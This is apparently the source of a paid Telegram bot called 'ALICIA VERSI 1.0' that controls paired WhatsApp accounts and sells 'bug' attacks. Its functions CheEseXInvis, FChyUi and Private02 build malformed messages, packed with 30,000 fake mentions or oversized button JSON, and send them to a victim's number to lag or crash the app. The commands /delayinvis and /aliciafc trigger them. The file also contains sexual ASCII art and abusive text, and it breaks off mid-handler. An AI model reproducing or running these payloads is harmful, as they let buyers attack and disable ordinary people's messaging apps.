const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));



const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/IKYZtyz/FORTEC-INVICTUS/refs/heads/main/Fortec-Invictus.json"; 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("TOKEN SEDANG DI CEK"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("YAH TOKEN KAMU GA TERDAFTAR DI DATABASE KU :(, BUY AKSES KE @vanznewera."));
    process.exit(1);
  }

  console.log(chalk.green(` MANTAP BUYER SEJATI NIH!!!⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`\n
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀SAYANG ENAK BANGETTT⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠤⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀SLUP SLUP SLUP
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
AH AH AH ENAK SAYANG⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));


console.log(chalk.bold.blue(`
═════════════════════════
         A L I C A -  V E R S I 1.0 
═════════════════════════
`));

console.log(chalk.blue(`
—————【 PRIVATE BOT 】—————
`));
};

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/azpl5o.jpg",
        "https://files.catbox.moe/azpl5o.jpg",
        "https://files.catbox.moe/azpl5o.jpg",
        "https://files.catbox.moe/azpl5o.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}



// ---------( The Bug Function)----------
async function CheEseXInvis(jid) {
const generateMessage = {
viewOnceMessage: {
message: {
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
caption: "⎋ 𝐂𝐡𝐞𝐞𝐬𝐞𝐂𝐫𝐚𝐬𝐡͜͢-‣",
fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
fileLength: "19769",
height: 354,
width: 783,
mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
mediaKeyTimestamp: "1743225419",
jpegThumbnail: null,
scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
scanLengths: [2437, 17332],
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
isSampled: true,
participant: jid,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true
}
}
}
}
};

const msg = generateWAMessageFromContent(jid, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [jid],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: jid },
content: undefined
}
]
}
]
}
]
});

if (jid) {
await sock.relayMessage(jid,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐂𝐡𝐞𝐄𝐬𝐞𝐱" },
content: undefined
}
]
}
);
}
}
async function FChyUi(jid) {
let vanzneweraForceX = JSON.stringify({
status: true,
criador: "vanzneweraForceX",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "#ALICIA VERSI 1.0 Team🌚",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: vanzneweraForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
{ name: "call_permission_request", buttonParamsJson: vanzneweraForceX + "\u0003",},
{ name: "mpm", buttonParamsJson: vanzneweraForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
]
}
}
}
}
};

await sock.relayMessage(jid, messagePayload, { participant: { jid: jid } });
}

async function Private02(jid) {
let Private02 = JSON.stringify({
status: true,
criador: "hyuiForcex",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
try {
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid,
},
},
body: {
text: "#ALICIA VERSI 1.0 Team🌚",
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "call_permission_request",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
],
},
},
},
},
};

await sock.relayMessage(jid, message, {
participant: { jid: jid },
});
} catch (err) {
console.log(err);
}
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/babu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`Akses Ditolak❗\`\`\`
Yahahahah mulung kontol sana minta akses ke owner gw`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗢𝘄𝗻𝗲𝗿", url: "https://t.me/vanznewera" }]]
      }
    });
  }

  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ⓘALICIA
┏━ ᯓ ALICIA VERSI 1.0 ✰
┃ Developer : vanznewera
┃ Version : 1.0 PRO
┃ Language : JavaScript
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ INFORMATION ✰
┃ Runtime : ${runtime}
┃ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ THANKS TO ✰
┃  vanz ( Developer )
┃  Rzky ( Friend )
┃  AlwaysMunn ( Friend )
┃  Fantzy ( Friend )
┃ ALL TEAM ALICIA
┃ ALL BUYER ALICIA
┗━━━━━━━━━━━━━━━━━━━━━━━
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "AdminMenu", callback_data: "setting" }, { text: "OwnerMenu", callback_data: "owner_menu" }],
        [{ text: "SpesialBug", callback_data: "vasbug" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "vasbug") {
      caption = `\`\`\`ⓘALICIA
┏━ ᯓ ALICIA VERSI 1.0 ✰
┃ Developer : vanznewera
┃ Version : 1.0 PRO
┃ Language : JavaScript
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ INFORMATION ✰
┃ Runtime : ${runtime}
┃ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ DELAY BUG ✰
┃ /delayinvis 62xxx - delay invis
┃ /delayframe 62xxx - delay frame
┃ /xinvis 62xxx - hard delay invis
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ FOR CLOSE BUG ✰
┃ /aliciafc 62xxx - Forclose Low
┃ /aliciaxvanz 62xxx - Forclose Medium
┃ /aliciaa 62xxx - Forclose Hard
┗━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]]
      };
    }

    if (query.data === "setting") {
      caption = `\`\`\`ⓘALICIA
┏━ ᯓ ALICIA VERSI 1.0 ✰
┃ Developer : vanznewera
┃ Version : 1.0 PRO
┃ Language : JavaScript
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ INFORMATION ✰
┃ Runtime : ${runtime}
┃ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ CONTROL MENU ✰
┃ /setcd <5m>
┃ /addprem <id>
┃ /delprem <id>
┃ /addsender 62xxx
┗━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]]
      };
    }
    
    if (query.data === "owner_menu") {
      caption = `\`\`\`ⓘALICIA
┏━ ᯓ ALICIA VERSI 1.0 ✰
┃ Developer : vanznewera
┃ Version : 1.0 PRO
┃ Language : JavaScript
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ INFORMATION ✰
┃ Runtime : ${runtime}
┃ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ OWNER MENU ✰
┃ /addown <id>
┃ /delown <id>
┗━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗮𝗰𝗸", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`ⓘALICIA
┏━ ᯓ ALICIA VERSI 1.0 ✰
┃ Developer : vanznewera
┃ Version : 1.0 PRO
┃ Language : JavaScript
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ INFORMATION ✰
┃ Runtime : ${runtime}
┃ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━━━━
┏━ ᯓ THANKS TO ✰
┃  vanz ( Developer )
┃  Rzky ( Friend )
┃  AlwaysMunn ( Friend )
┃  Fantzy ( Friend )
┃ ALL TEAM ALICIA
┃ ALL BUYER ALICIA
┗━━━━━━━━━━━━━━━━━━━━━━━
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ.
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "AdminMenu", callback_data: "setting" }, { text: "OwnerMenu", callback_data: "owner_menu" }],
          [{ text: "SpesialBug🦠", callback_data: "vasbug" }]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======CASE BUG=========//

bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
